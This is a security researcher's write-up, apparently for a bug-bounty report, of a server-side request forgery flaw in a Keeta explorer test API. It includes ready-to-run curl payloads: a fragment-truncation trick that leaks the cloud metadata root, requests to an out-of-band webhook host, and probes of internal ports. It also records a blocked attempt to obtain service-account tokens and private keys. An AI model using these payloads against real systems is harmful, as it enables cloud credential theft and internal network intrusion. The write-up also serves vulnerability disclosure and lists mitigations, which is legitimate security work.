# Keeta SSRF Part 2 — Fragment # Truncation, Redirect NOT Followed, Error Leak

Date: 2026-08-12 | Target: explorer.test.keeta.com (Google Frontend 2600:1900:0:2e02::400) | Explorer: apps/server Hono + KeetaNet Client

## Summary
Follow-up to `keeta-network-ssrf-2026-08-12.md` (PROVEN pre-auth SSRF via Custom Host). Part 2 proves error-based disclosure via `metadata#` fragment truncation, validates redirect chain is NOT followed, and documents credential hunt blocked by `Metadata-Flavor: Google`.

## 1. Timing Oracle (SSRF proven)
- no host: `200 0.31s {"json":{"account":{...}}}`
- `?host=evil.com&networkAlias=test` -> `500 26-27s Failed to make API call (not ok)`
- `?host=127.0.0.1` -> `500 26s fetch failed`
- `?host=example.com` header `x-network-host` same 27s — dual vector.
- Webhook OAST: `webhook.site/28278b5e-6454-4a2d-aae1-4ce9dc67ec01` 48 hits + `49422d87-...` duplicate, UA `KeetaNet/v0.18.0+g5417... (JS)` to `/api/node/ledger/representatives`, IP `2600:1900:0:2e02::400`.

## 2. Fragment # Truncation (bypass /api suffix)
Code: `network/custom.ts:36 api = http${ssl?'s':''}://${host}/api` — always appends `/api`.
- `host=metadata#` -> `http://metadata#/api` -> URL parser strips `#/api` -> `http://metadata/` (correct GCP root). Raw `#` in query = fragment not sent by browser/curl -> fallback 200 (no SSRF). Encoded `%23` -> server decodes to `#`, then URL parsing strips `#/api` -> SSRF succeeds.
- Proven leak: `curl 'https://explorer.test.keeta.com/api/v1/account/keeta_aaboj...?host=metadata%23&networkAlias=test&ssl=false'` -> `500 {"message":"Unexpected token 'c', \"computeMetadata/\\n\" is not valid JSON"}` — directory listing via JSON parse error. Same for `169.254.169.254%23` and `metadata.google.internal%23`. 
- Deeper path `host=169.254.169.254/computeMetadata/v1%23` -> `Failed to make API call (not ok)` (403 without Metadata-Flavor header, HTML not leaked). CRLF `%0D%0A Metadata-Flavor:` filtered (empty).

## 3. Redirect Chain NOT Followed
- Created pair: `A 34ea918d-accc-4071-9cbb-5fe462a5838e` (302 Location: https://webhook.site/B) -> `B d82dd45f-a0a4-4a60-8058-09c09fb59505`. A hit 50x (http://webhook.site/A/api/node/ledger/representatives), B 0x. Same with `httpbin.org/redirect-to?url=...`. Conclusion: Keeta GeneratedTransport (reqwest) does NOT follow 302, so `A -> http://169.254.169.254/computeMetadata/...` exfil blocked. Report as Blind SSRF, not full token exfil.

## 4. Credential Hunt (blocked)
- Root `computeMetadata/` leaked via error, deeper `/instance/service-accounts/default/token` blocked by missing `Metadata-Flavor: Google` and `/api` suffix. Port oracle: `127.0.0.1:8080#` -> `Failed not ok` (port open, hang 26s) vs `127.0.0.1#` -> `fetch failed` (refused). No `ya29.`/`BEGIN PRIVATE` leaked after 20+ paths (ports 3000,5000,8001,2375,10250,10.128.0.1).
- Dev network seed `DEV_SEED 1000...0` index `0xffffffff` and `TRUSTED_SEED 0x77*32` only for harness/dev, explorer `/network/settings` all `hasDemoAccounts:false hasFountain:false` — no fountain abuse on prod. `description_char` lacks `< >`, `name_char` only `A-Z_` max 50 -> stored XSS blocked. Ranking: #2 cutoff negative-amount theft more promising than XSS.

## 5. Payloads for Report
```bash
# Error leak (proven)
curl 'https://explorer.test.keeta.com/api/v1/account/keeta_aaboj3lndhqf5znsqsy5uu57wvcdxsmkzguhy7gvgrwxudhws2sy655fyeoco6y?host=metadata%23&networkAlias=test&ssl=false'
# SSRF external (48 hits)
curl 'https://explorer.test.keeta.com/api/v1/account/keeta_aaboj3lndhqf5znsqsy5uu57wvcdxsmkzguhy7gvgrwxudhws2sy655fyeoco6y?host=webhook.site/28278b5e-6454-4a2d-aae1-4ce9dc67ec01&networkAlias=test'
# Header variant
curl -H 'x-network-host: webhook.site/28278b5e-6454-4a2d-aae1-4ce9dc67ec01' -H 'x-network-alias: test' https://explorer.test.keeta.com/api/v1/account/keeta_aaboj3lndhqf5znsqsy5uu57wvcdxsmkzguhy7gvgrwxudhws2sy655fyeoco6y
```
Mitigation: allow-list `*.keeta.com`, block `10/8 172.16/12 192.168/16 169.254.169.254 metadata.google.internal`, strip user-supplied `host` for unauth, disable `networkInstances` cache for custom host, validate `host` regex `^[a-z0-9.-]+(:\d+)?$`.

## POCs
- `MEDIA:/tmp/poc_redirect.py` (webhook redirect chain + internal differential)
- `MEDIA:/tmp/poc_keeta_ssrf.py` (basic SSRF)
